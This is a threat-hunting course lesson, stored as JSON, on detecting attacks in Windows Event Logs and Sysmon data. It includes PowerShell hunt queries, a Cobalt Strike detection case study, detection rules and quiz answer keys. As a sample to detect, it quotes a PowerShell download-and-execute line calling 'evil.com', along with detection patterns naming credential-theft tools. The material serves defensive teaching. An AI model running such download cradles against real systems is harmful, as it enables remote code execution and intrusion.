{
  "lesson_id": "a5f1c2ce-91d5-4135-8a73-224bc7b9c3b4",
  "domain": "threat_hunting",
  "title": "Windows Event Log Analysis for Threat Hunters",
  "difficulty": 2,
  "order_index": 3,
  "prerequisites": [
    "th-001-fundamentals",
    "th-002-methodologies"
  ],
  "concepts": [
    "Windows Event Log structure and channels",
    "Critical security event IDs for hunting",
    "Sysmon for enhanced logging",
    "PowerShell logging and analysis",
    "Authentication and lateral movement detection",
    "Event log hunting queries and correlation"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Master critical Windows Event IDs for threat hunting",
    "Deploy and analyze Sysmon for enhanced visibility",
    "Hunt for lateral movement via event logs",
    "Detect credential theft and privilege escalation",
    "Build effective event log queries and correlation rules",
    "Identify attacker patterns in Windows logs"
  ],
  "post_assessment": [
    {
      "question": "Which Windows Event ID indicates a successful logon?",
      "options": [
        "Event ID 4625 (Failed logon)",
        "Event ID 4624 (Successful logon)",
        "Event ID 4648 (Explicit credential use)",
        "Event ID 4672 (Special privileges assigned)"
      ],
      "correct_answer": 1,
      "difficulty": 1,
      "type": "multiple_choice",
      "question_id": "b0ce2ca3-d228-4ed6-9d0a-986149c30fa8",
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is Sysmon Event ID 1 used for?",
      "options": [
        "Network connection",
        "Process creation with command-line arguments",
        "File creation time change",
        "Registry value set"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "afc9ccbe-56b0-4997-a704-a07ecb559a81",
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which logon type indicates RDP access?",
      "options": [
        "Logon Type 2 (Interactive)",
        "Logon Type 3 (Network)",
        "Logon Type 10 (RemoteInteractive)",
        "Logon Type 5 (Service)"
      ],
      "correct_answer": 2,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "a19d36de-b817-44ac-82b7-c51b34b495d2",
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "memory_hooks",
    "connect_to_what_i_know",
    "multiple_memory_pathways",
    "teach_like_im_10",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Windows Event Logs: The Hunter's Foundation\n\nWindows Event Logs are the **most valuable data source** for threat hunting on Windows systems. Every action—logins, process execution, network connections, file access—generates event logs. For threat hunters, these logs are digital breadcrumbs left by adversaries.\n\n## Why Windows Event Logs Matter\n\n**The Reality**:\n- Windows runs on **70%+ of enterprise endpoints**\n- Attackers **must** interact with Windows to achieve their goals\n- Every interaction generates event logs (if logging is enabled)\n- **Most breaches are visible in Windows logs** if you know where to look\n\n**The Challenge**:\n- Default Windows logging is **insufficient** for threat hunting\n- Event logs can generate **millions of events per day**\n- Finding malicious activity is like **finding a needle in a haystack**\n- You need to know **which event IDs matter** and what's normal vs suspicious\n\n## Windows Event Log Structure\n\nWindows organizes events into **channels** (log files):\n\n### Core Event Log Channels\n\n**1. Security Log** (`Security.evtx`)\n- **Most critical for threat hunting**\n- Contains: Authentication events, privilege use, object access, policy changes\n- Location: `C:\\Windows\\System32\\winevt\\Logs\\Security.evtx`\n- Requires: Admin privileges to read\n\n**2. System Log** (`System.evtx`)\n- System-level events: Service starts/stops, driver loads, system errors\n- Less useful for hunting but important for context\n\n**3. Application Log** (`Application.evtx`)\n- Application crashes, errors, warnings\n- Useful for detecting exploitation (unusual crashes)\n\n**4. PowerShell Logs** (Multiple channels)\n- `Microsoft-Windows-PowerShell/Operational`\n- `Windows PowerShell.evtx`\n- Critical for detecting PowerShell-based attacks\n\n**5. Sysmon Log** (`Microsoft-Windows-Sysmon/Operational`)\n- **Essential for threat hunting** (requires Sysmon installation)\n- Provides process creation, network connections, file/registry changes\n- More detailed than default Windows logging\n\n### Event Log Anatomy\n\nEach event contains:\n\n```xml\n<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n<System>\n<Provider Name=\"Microsoft-Windows-Security-Auditing\" />\n<EventID>4624</EventID>\n<TimeCreated SystemTime=\"2025-01-15T14:30:22.123Z\" />\n<Computer>WORKSTATION01</Computer>\n</System>\n<EventData>\n<Data Name=\"SubjectUserName\">Administrator</Data>\n<Data Name=\"TargetUserName\">john.doe</Data>\n<Data Name=\"LogonType\">10</Data>\n<Data Name=\"IpAddress\">192.168.1.50</Data>\n</EventData>\n</Event>\n```\n\n**Key Fields**:\n- **EventID**: Identifies event type (4624 = successful logon)\n- **TimeCreated**: When event occurred (UTC)\n- **Computer**: Which system generated the event\n- **EventData**: Event-specific details (usernames, IPs, process names)\n\n## The Hunter's Event ID Cheat Sheet\n\nYou don't need to memorize **all** event IDs. Focus on the **20% that matter for 80% of threats**.\n\n### Authentication & Logon (Security Log)\n\n**Event ID 4624 - Successful Logon**\n- **What**: User successfully authenticated\n- **Key Field**: `LogonType` (see logon types below)\n- **Hunt For**: Unusual logon times, unexpected users, lateral movement\n\n**Event ID 4625 - Failed Logon**\n- **What**: Authentication failure\n- **Key Field**: `FailureReason` (bad password, account locked, etc.)\n- **Hunt For**: Brute force attacks, password spraying\n\n**Event ID 4648 - Logon Using Explicit Credentials**\n- **What**: User A logged in as User B (e.g., `runas`)\n- **Key Field**: `SubjectUserName` (who initiated) and `TargetUserName` (who they became)\n- **Hunt For**: Credential theft, privilege escalation, pass-the-hash\n\n**Event ID 4672 - Special Privileges Assigned**\n- **What**: Admin/privileged account logged in\n- **Key Field**: `PrivilegeList` (SeDebugPrivilege, SeBackupPrivilege, etc.)\n- **Hunt For**: Unauthorized privilege escalation\n\n### Logon Types (Critical for Hunting)\n\n| Logon Type | Description | Use Case | Hunting Notes |\n|------------|-------------|----------|---------------|\n| **2** | Interactive | Physical/console login | Rare on servers - investigate |\n| **3** | Network | SMB file shares, net use | Normal for file access, suspicious for unusual times |\n| **4** | Batch | Scheduled tasks | Persistence mechanism |\n| **5** | Service | Service started by SCM | Persistence mechanism |\n| **7** | Unlock | Workstation unlocked | Rare on servers |\n| **10** | RemoteInteractive | RDP, Remote Desktop | **Critical for lateral movement detection** |\n| **11** | CachedInteractive | Cached credentials (offline) | Domain controller unreachable |\n\n**Memory Aid**: **\"RDP is Type 10\"** - Most important for lateral movement hunting.\n\n### Process Execution (Sysmon Event ID 1)\n\n**Sysmon Event ID 1 - Process Creation**\n- **What**: New process started with full command-line\n- **Key Fields**: `Image` (executable path), `CommandLine`, `ParentImage`, `User`\n- **Hunt For**: Suspicious processes (PowerShell, cmd.exe, wmic.exe, etc.)\n\n**Example Malicious Process**:\n```\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -NoP -sta -NonI -W Hidden -Enc [base64 blob]\nParentImage: C:\\Windows\\System32\\cmd.exe\nUser: DOMAIN\\lowprivuser\n```\n\n**Red Flags**:\n- `-EncodedCommand` (obfuscation)\n- `-WindowStyle Hidden` (stealth)\n- Spawned by unusual parent (cmd.exe from winword.exe)\n\n### Network Connections (Sysmon Event ID 3)\n\n**Sysmon Event ID 3 - Network Connection**\n- **What**: Process initiated network connection\n- **Key Fields**: `Image`, `DestinationIp`, `DestinationPort`, `User`\n- **Hunt For**: C2 beaconing, data exfiltration, lateral movement\n\n**Example C2 Beaconing**:\n```\nImage: C:\\Users\\john\\AppData\\Roaming\\svchost.exe\nDestinationIp: 198.51.100.50 (external IP)\nDestinationPort: 443 (HTTPS)\nUser: DOMAIN\\john.doe\n```\n\n**Red Flags**:\n- Unusual process making external connections (notepad.exe → internet)\n- Connections to suspicious IPs (threat intel match)\n- Regular beacon intervals (every 60 seconds)\n\n### PowerShell Execution (Event ID 4104)\n\n**Event ID 4104 - PowerShell Script Block Logging**\n- **What**: PowerShell command executed\n- **Key Fields**: `ScriptBlockText` (actual command run)\n- **Hunt For**: Malicious PowerShell (Invoke-Mimikatz, Invoke-Expression, DownloadString)\n\n**Example Malicious PowerShell**:\n```\nScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\n```\n\n**Red Flags**:\n- `IEX` (Invoke-Expression) - runs downloaded scripts\n- `DownloadString` - downloads remote code\n- `EncodedCommand` - obfuscation\n- `Bypass` - execution policy bypass"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Sysmon: The Threat Hunter's Best Friend\n\n**Sysmon** (System Monitor) is a **free Windows system service** from Microsoft Sysinternals that provides **enhanced logging** far beyond default Windows Event Logs.\n\n### Why Sysmon is Essential\n\n**Default Windows logging does NOT capture**:\n- ❌ Process command-line arguments\n- ❌ Network connections made by processes\n- ❌ File creation timestamps changes\n- ❌ Registry modifications\n- ❌ Process access (LSASS dumping)\n\n**Sysmon provides**:\n- ✅ **Event ID 1**: Process creation with full command-line\n- ✅ **Event ID 3**: Network connections (IP, port, process)\n- ✅ **Event ID 7**: Image/DLL loaded\n- ✅ **Event ID 8**: CreateRemoteThread (process injection)\n- ✅ **Event ID 10**: Process access (Mimikatz accessing LSASS)\n- ✅ **Event ID 11**: File creation\n- ✅ **Event ID 12-14**: Registry events\n- ✅ **Event ID 22**: DNS query\n\n### Installing Sysmon\n\n**Download**:\n```powershell\n# Download Sysmon from Microsoft Sysinternals\nhttps://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\n```\n\n**Install with SwiftOnSecurity Config** (recommended):\n```powershell\n# Download SwiftOnSecurity Sysmon config (excellent baseline)\nInvoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile sysmonconfig.xml\n\n# Install Sysmon with config\n.\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n```\n\n**Verify Installation**:\n```powershell\n# Check Sysmon service is running\nGet-Service Sysmon64\n\n# View Sysmon events\nGet-WinEvent -LogName \"Microsoft-Windows-Sysmon/Operational\" -MaxEvents 10\n```bash\n\n### Critical Sysmon Event IDs for Hunting\n\n**Event ID 1 - Process Creation**\n\nHunt for suspicious processes:\n\n```powershell\n# PowerShell with suspicious flags\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | \nWhere-Object {$_.Message -match 'powershell.*-enc|-nop|-w hidden'}\n```\n\n**Event ID 3 - Network Connection**\n\nHunt for external connections from unusual processes:\n\n```powershell\n# Excel/Word making external connections (suspicious)\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} | \nWhere-Object {$_.Message -match 'EXCEL.EXE|WINWORD.EXE' -and $_.Message -notmatch '192.168|10.|172.16'}\n```\n\n**Event ID 10 - Process Access**\n\nHunt for LSASS memory access (credential dumping):\n\n```powershell\n# Mimikatz accessing LSASS\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} | \nWhere-Object {$_.Message -match 'lsass.exe'}\n```\n\n**Event ID 22 - DNS Query**\n\nHunt for suspicious domains:\n\n```powershell\n# Suspicious TLDs or dynamic DNS\nGet-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=22} | \nWhere-Object {$_.Message -match '.tk$|.xyz$|.top$|duckdns.org|ngrok.io'}\n```bash\n\n### Sysmon vs Native Windows Events\n\n| Data | Windows Security Log | Sysmon |\n|------|---------------------|--------|\n| Process creation | ✅ (Event 4688) | ✅ (Event 1) |\n| **Command-line** | ⚠️ (requires policy) | ✅ **Always logged** |\n| Network connections | ❌ | ✅ (Event 3) |\n| Process injection | ❌ | ✅ (Event 8) |\n| LSASS access | ❌ | ✅ (Event 10) |\n| DNS queries | ❌ | ✅ (Event 22) |\n| File creation | ⚠️ (requires auditing) | ✅ (Event 11) |\n\n**Bottom Line**: **Sysmon is mandatory for effective threat hunting on Windows.**"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Practical Hunting Queries\n\n### Hunt 1: Lateral Movement Detection (RDP)\n\n**Hypothesis**: \"If an attacker is moving laterally, they would use RDP from workstation to workstation.\"\n\n**PowerShell Query**:\n```powershell\n# Find RDP logins (Type 10) from non-admin workstations\nGet-WinEvent -FilterHashtable @{\nLogName='Security'\nID=4624\n} | Where-Object {\n$xml = [xml]$_.ToXml()\n$logonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'\n$sourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'\n\n# Type 10 = RDP, exclude localhost\n$logonType -eq '10' -and $sourceIP -ne '127.0.0.1' -and $sourceIP -ne '::1'\n} | Select-Object TimeCreated, Message -First 20\n```\n\n**What to Look For**:\n- RDP from workstation IPs (192.168.1.x) instead of admin jump boxes\n- RDP during off-hours (nights, weekends)\n- RDP from unexpected users\n\n### Hunt 2: Credential Dumping (Mimikatz)\n\n**Hypothesis**: \"If an attacker dumps credentials, they would access LSASS memory.\"\n\n**PowerShell Query (Requires Sysmon)**:\n```powershell\n# Sysmon Event ID 10: Process Access to LSASS\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-Sysmon/Operational'\nID=10\n} | Where-Object {\n$_.Message -match 'TargetImage.*lsass.exe'\n} | ForEach-Object {\n$xml = [xml]$_.ToXml()\n$sourceImage = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceImage'} | Select-Object -ExpandProperty '#text'\n\n[PSCustomObject]@{\nTime = $_.TimeCreated\nSourceProcess = $sourceImage\nTargetProcess = 'lsass.exe'\nComputer = $_.MachineName\n}\n}\n```\n\n**What to Look For**:\n- Non-system processes accessing LSASS (exclude wininit.exe, csrss.exe)\n- Processes from temp directories (C:\\Users\\*\\AppData\\Local\\Temp)\n- Suspicious process names (mimikatz.exe, procdump.exe)\n\n### Hunt 3: PowerShell-Based Attacks\n\n**Hypothesis**: \"If an attacker is using PowerShell for exploitation, they would use encoded or obfuscated commands.\"\n\n**PowerShell Query**:\n```powershell\n# PowerShell Script Block Logging (Event ID 4104)\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-PowerShell/Operational'\nID=4104\n} | Where-Object {\n$_.Message -match 'IEX|Invoke-Expression|DownloadString|EncodedCommand|Bypass|-nop|-w hidden'\n} | Select-Object TimeCreated, Message -First 10\n```\n\n**What to Look For**:\n- `IEX (New-Object Net.WebClient).DownloadString` - downloads remote scripts\n- `-EncodedCommand` - obfuscated PowerShell\n- `Invoke-Mimikatz`, `Invoke-Kerberoast` - common attack tools\n- `-ExecutionPolicy Bypass` - bypassing security\n\n### Hunt 4: Scheduled Task Persistence\n\n**Hypothesis**: \"If an attacker establishes persistence, they would create scheduled tasks.\"\n\n**PowerShell Query**:\n```powershell\n# Event ID 4698: Scheduled task created\nGet-WinEvent -FilterHashtable @{\nLogName='Security'\nID=4698\n} | ForEach-Object {\n$xml = [xml]$_.ToXml()\n$taskName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskName'} | Select-Object -ExpandProperty '#text'\n$taskContent = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TaskContent'} | Select-Object -ExpandProperty '#text'\n\n[PSCustomObject]@{\nTime = $_.TimeCreated\nTaskName = $taskName\nTaskContent = $taskContent\nUser = $_.UserId\n}\n} | Where-Object {\n# Filter suspicious tasks\n$_.TaskContent -match 'powershell|cmd.exe|wscript|cscript|rundll32'\n}\n```\n\n**What to Look For**:\n- Tasks executing PowerShell/cmd.exe\n- Tasks created by non-admin users\n- Tasks with unusual names (random characters)\n- Tasks running from temp directories\n\n### Hunt 5: Unusual Service Creation\n\n**Hypothesis**: \"If an attacker creates a malicious service, Event ID 7045 will be generated.\"\n\n**PowerShell Query**:\n```powershell\n# Event ID 7045: Service installed\nGet-WinEvent -FilterHashtable @{\nLogName='System'\nID=7045\n} | ForEach-Object {\n$xml = [xml]$_.ToXml()\n$serviceName = $xml.Event.EventData.Data[0]\n$serviceFile = $xml.Event.EventData.Data[1]\n\n[PSCustomObject]@{\nTime = $_.TimeCreated\nServiceName = $serviceName\nImagePath = $serviceFile\nComputer = $_.MachineName\n}\n} | Where-Object {\n# Filter suspicious services\n$_.ImagePath -match 'powershell|cmd.exe|temp|appdata|users' -or\n$_.ServiceName -match '^[a-z]{8,10}$'  # Random 8-10 char names\n}\n```\n\n**What to Look For**:\n- Services with random names\n- Services running from user directories\n- Services executing PowerShell/cmd.exe\n- Services created during off-hours"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Hunt: Detecting Cobalt Strike\n\n### Background\n\nA Fortune 500 company's threat hunting team detected **Cobalt Strike** beacons in their environment using Windows Event Log analysis. Here's how they found it.\n\n### The Hunt Process\n\n**Step 1: Hypothesis Formation**\n\n\"If Cobalt Strike is active in our environment, we would see:\n1. Named pipes created with beacon patterns\n2. Processes injecting into other processes\n3. Regular network beaconing\n4. PowerShell execution from Office processes\"\n\n**Step 2: Hunt Execution**\n\n**Query 1: Named Pipe Creation** (Cobalt Strike uses named pipes for SMB beacons)\n\n```powershell\n# Sysmon Event ID 17/18: Pipe Created/Connected\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-Sysmon/Operational'\nID=17,18\n} | Where-Object {\n$_.Message -match 'MSSE-|postex_|status_|msagent_'\n}\n```\n\n**Result**: Found pipe named `\\\\MSSE-1234-server` (Cobalt Strike default pattern)\n\n**Query 2: Process Injection**\n\n```powershell\n# Sysmon Event ID 8: CreateRemoteThread\nGet-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-Sysmon/Operational'\nID=8\n} | Where-Object {\n$xml = [xml]$_.ToXml()\n$sourceImage = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'SourceImage'}).'#text'\n$targetImage = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetImage'}).'#text'\n\n# Suspicious: rundll32 injecting into explorer.exe\n$sourceImage -match 'rundll32' -and $targetImage -match 'explorer.exe'\n}\n```\n\n**Result**: Found `rundll32.exe` injecting into `explorer.exe` (beacon injection)\n\n**Query 3: Network Beaconing**\n\n```powershell\n# Sysmon Event ID 3: Network connections with regular intervals\n$connections = Get-WinEvent -FilterHashtable @{\nLogName='Microsoft-Windows-Sysmon/Operational'\nID=3\n} | Where-Object {\n$xml = [xml]$_.ToXml()\n$destIP = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'DestinationIp'}).'#text'\n$destPort = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'DestinationPort'}).'#text'\n\n# External IPs on port 443/80\n$destIP -notmatch '^(192\\.168|10\\.|172\\.(1[6-9]|2[0-9]|3[01]))' -and\n$destPort -in @('80', '443')\n}\n\n# Group by destination IP and check for regular intervals\n$connections | Group-Object {\n$xml = [xml]$_.ToXml()\n($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'DestinationIp'}).'#text'\n} | Where-Object {$_.Count -gt 50}  # More than 50 connections = beaconing\n```\n\n**Result**: Found connections to `198.51.100.50` every 60 seconds (C2 beaconing)\n\n### The Discovery\n\n**Timeline Reconstruction**:\n\n```\nDay 1, 09:30 - Initial phishing email with malicious Word doc\nDay 1, 09:45 - WINWORD.EXE spawned PowerShell (Sysmon Event ID 1)\nDay 1, 09:46 - PowerShell created scheduled task for persistence (Event ID 4698)\nDay 1, 09:47 - Named pipe created: MSSE-1234-server (Sysmon Event ID 17)\nDay 1, 09:48 - Beacon established to 198.51.100.50:443 (Sysmon Event ID 3)\nDay 2-7     - Regular beaconing every 60 seconds\nDay 7, 14:00 - Lateral movement via RDP to finance server (Event ID 4624, Type 10)\nDay 7, 14:15 - LSASS memory dump on finance server (Sysmon Event ID 10)\nDay 7, 14:30 - HUNT TEAM DISCOVERS BEACON\n```bash\n\n### Response\n\n1. **Isolated compromised systems** from network\n2. **Blocked C2 IP** at firewall (198.51.100.50)\n3. **Killed beacon processes** and removed scheduled tasks\n4. **Reset all compromised credentials**\n5. **Deployed new detection rules** based on findings\n\n### Lessons Learned\n\n**What Worked**:\n- ✅ Sysmon provided critical visibility (pipe creation, process injection)\n- ✅ Hypothesis-driven hunting found threat in 7 days (vs industry average 21 days)\n- ✅ Event log correlation revealed full attack timeline\n\n**What Could Be Better**:\n- ⚠️ Initial PowerShell execution went undetected for 7 days\n- ⚠️ Need real-time detection for LSASS access\n- ⚠️ Scheduled task creation should trigger immediate alert\n\n### Detection Rules Created\n\n**Rule 1: Cobalt Strike Named Pipes**\n```yaml\ntitle: Cobalt Strike Named Pipe Patterns\ndetection:\nselection:\nEventID: 17\nPipeName:\n- '*MSSE-*'\n- '*postex_*'\n- '*status_*'\n- '*msagent_*'\ncondition: selection\nlevel: critical\n```\n\n**Rule 2: Office Process Spawning PowerShell**\n```yaml\ntitle: Office Document Spawning PowerShell\ndetection:\nselection:\nEventID: 1\nParentImage:\n- '*WINWORD.EXE'\n- '*EXCEL.EXE'\n- '*POWERPNT.EXE'\nImage: '*powershell.exe'\ncondition: selection\nlevel: high\n```\n\n**Outcome**: Company prevented data exfiltration and shared IOCs with industry peers."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aids for Windows Event Log Hunting\n\n### SALF - Critical Log Types\n\n**S** - **Security Log**: Authentication, privilege use (Event 4624, 4625, 4648)\n**A** - **Application Log**: App crashes, errors\n**L** - **sysmon Log**: Process creation, network, injection (Event 1, 3, 8, 10)\n**F** - **powerShell/orwarding**: PowerShell execution logs (Event 4104)\n\n### The \"Big 5\" Authentication Events\n\n**4624** - Successful logon (Type 10 = RDP)\n**4625** - Failed logon (brute force)\n**4648** - Explicit credentials (runas, Pass-the-Hash)\n**4672** - Special privileges (admin logon)\n**4698** - Scheduled task created (persistence)\n\n**Memory Trick**: \"**46** is for authentication, **47** is for privileges\"\n\n### Sysmon Event ID Memory Map\n\n**1** - **1** process created\n**3** - **3** = network (3 letters in \"net\")\n**7** - **7** letters in \"DLL load\"\n**8** - **8**njection (CreateRemoteThread)\n**10** - **10** letters in \"LSASS dump\" (close enough!)\n**22** - **22** = DNS (2 letters in \"domain name\")\n\n### Logon Type Memory Trick\n\n**Type 2** - **2** hands on keyboard (Interactive)\n**Type 3** - **3** = SMB (**3** letters)\n**Type 10** - **10** fingers typing on remote desktop (RDP)\n\n### PowerShell Red Flags: DIED\n\n**D** - **DownloadString**: Downloads remote code\n**I** - **IEX** (Invoke-Expression): Executes downloaded code\n**E** - **EncodedCommand**: Obfuscation\n**D** - **-nop** or **Bypass**: Disables security\n\n### Visual: Event Log Hunting Workflow\n\n```\n[Hypothesis] → [Identify Event IDs] → [Build Query] → [Execute] → [Analyze]\n↓              ↓                      ↓              ↓          ↓\n\"RDP lateral   Event 4624          Get-WinEvent    Results    True positive?\nmovement\"     LogonType=10        PowerShell                       ↓\n[Document/Detect]\n```bash\n\n### Hunt Query Template\n\n```\n1. WHAT am I hunting for? (RDP lateral movement)\n2. WHICH Event ID? (4624)\n3. WHAT filter? (LogonType = 10, exclude localhost)\n4. WHAT time range? (Last 7 days)\n5. WHAT's suspicious? (Workstation-to-workstation RDP, off-hours)\n```"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection Questions\n\nTake a moment to think deeply about these questions:\n\n1. **If you could only enable ONE event log source for threat hunting, would you choose Security Log or Sysmon? Why?**\n\n*Hint: Consider what each provides. Security gives authentication, Sysmon gives process detail.*\n\n2. **Look at your current environment. Are you logging PowerShell script block execution (Event 4104)? If not, what are you missing?**\n\n*Most PowerShell-based attacks would be invisible without this logging.*\n\n3. **Think about the Cobalt Strike case study. What event was the \"smoking gun\" that confirmed the breach? Could it have been detected earlier?**\n\n*The named pipe pattern was definitive, but PowerShell from Word should have triggered alerts.*\n\n4. **Which is more valuable: 1 million default Windows events or 100,000 Sysmon events? Why?**\n\n*Quality over quantity. Sysmon captures what matters for hunting.*\n\n5. **If you found Event ID 4648 (explicit credential use) from a low-privilege user account at 3 AM, what would your next investigative steps be?**\n\n*Check: What user did they become? What system? What did they do after? Is this normal for this user?*\n\n6. **How would you differentiate between legitimate admin activity and attacker lateral movement in Event ID 4624 (logon) logs?**\n\n*Context matters: Source IP, time of day, user behavior baseline, logon type, what they accessed.*"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Mastering Windows Event Logs: Your Superpower\n\n### You've Just Unlocked Critical Skills\n\nWindows Event Logs are the **foundation** of threat hunting. You now know:\n\n✅ **The Big 5 Authentication Events** (4624, 4625, 4648, 4672, 4698)\n✅ **Sysmon Event IDs** that matter (1, 3, 8, 10, 22)\n✅ **Logon Types** and what they mean (Type 10 = RDP lateral movement)\n✅ **PowerShell red flags** (IEX, DownloadString, EncodedCommand)\n✅ **Practical hunt queries** you can run today\n✅ **Real-world detection** (Cobalt Strike named pipes)\n\n**This knowledge makes you immediately more effective as a threat hunter.**\n\n### The Hunter's Mindset: Logs Tell Stories\n\n**Every event is a sentence. Correlated events tell a story.**\n\nDon't look at Event ID 4624 in isolation. Ask:\n- What happened **before** this logon?\n- What did the user do **after** logging in?\n- Is this **normal** for this user?\n- What **other systems** did they access?\n\n**Example Story**:\n```\n09:30 - Event 4625: Failed logon (wrong password)\n09:31 - Event 4625: Failed logon (wrong password)\n09:32 - Event 4625: Failed logon (wrong password)\n09:33 - Event 4624: Successful logon (Type 3, from unusual IP)\n09:35 - Sysmon Event 1: net.exe user /domain (enumeration)\n09:36 - Event 4648: Explicit credentials used (privilege escalation)\n09:40 - Sysmon Event 10: LSASS access (credential dumping)\n```\n\n**This is an attack in progress.** The logs told the complete story.\n\n### Your Action Plan\n\n**This Week**:\n\n1. **Install Sysmon** on a test system:\n```powershell\n# Download and install with SwiftOnSecurity config\n.\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n```\n\n2. **Run Your First Hunt**:\n- Pick one query from this lesson (RDP lateral movement or PowerShell attacks)\n- Execute it on your environment\n- Document findings (even if benign)\n\n3. **Build Your Event ID Reference**:\n- Create a cheat sheet with the Big 5 + Sysmon IDs\n- Add real examples from your environment\n- Share with your team\n\n**This Month**:\n\n4. **Create 3 Hunt Playbooks**:\n- RDP lateral movement\n- PowerShell execution\n- Credential dumping\n\n5. **Baseline Your Environment**:\n- What's **normal** for Event 4624 logons in your environment?\n- Which users commonly use Type 10 (RDP)?\n- What PowerShell is benign vs suspicious?\n\n6. **Share Knowledge**:\n- Train your SOC team on these event IDs\n- Document your hunt findings\n- Build institutional knowledge\n\n### Resources for Deeper Learning\n\n**Event ID References**:\n- **Ultimate Windows Security**: https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/\n- **Microsoft Event ID Encyclopedia**: Official documentation\n\n**Sysmon**:\n- **SwiftOnSecurity Sysmon Config**: https://github.com/SwiftOnSecurity/sysmon-config\n- **Sysmon Modular**: https://github.com/olafhartong/sysmon-modular\n\n**Tools**:\n- **APT-Hunter**: Automated Windows event log hunter\n- **Chainsaw**: Fast Windows event log searcher\n- **Hayabusa**: High-speed timeline generator\n\n**Communities**:\n- **SANS DFIR Summit**: Free Windows forensics talks\n- **r/blueteamsec**: Active threat hunting community\n\n### Remember\n\n**Windows Event Logs are your eyes and ears in the environment.**\n\nEvery attack leaves traces. Your job is to:\n1. **Enable the right logging** (Sysmon + PowerShell)\n2. **Know which events matter** (Big 5 + Sysmon essentials)\n3. **Hunt with purpose** (hypothesis-driven queries)\n4. **Tell the story** (correlate events into timelines)\n\n**You're not just reading logs. You're reconstructing adversary behavior.**\n\n### Next Lesson Preview\n\nIn the next lesson, **Network Traffic Analysis for Threat Hunting**, we'll cover:\n- NetFlow, Zeek, and PCAP analysis\n- Detecting C2 beaconing in network traffic\n- DNS tunneling and data exfiltration\n- Building network-based hunt hypotheses\n\n**Windows logs show what happened on endpoints. Network logs show what traveled between them.**\n\nTogether, they give you **complete visibility** into adversary activity.\n\n**Keep hunting. The adversary is out there. Now you know how to find them.** 🎯"
      }
    }
  ]
}